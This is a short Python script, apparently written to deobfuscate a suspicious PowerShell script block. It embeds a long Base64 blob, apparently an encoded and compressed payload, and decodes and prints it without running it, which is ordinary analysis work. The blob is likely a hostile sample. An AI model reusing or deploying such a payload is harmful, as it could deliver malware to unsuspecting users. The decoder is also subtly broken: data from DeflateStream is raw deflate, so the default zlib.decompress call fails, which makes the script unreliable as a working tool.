import base64
import zlib

# The Base64 string from the script block (truncated for brevity, replace it with the full string)
base64_string = "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"

# Decode the Base64 string
decoded_data = base64.b64decode(base64_string)

# Decompress the data using zlib (as it's using DeflateStream in the PowerShell script)
decompressed_data = zlib.decompress(decoded_data)

# Print the result (could be a PowerShell or .NET assembly)
print(decompressed_data)

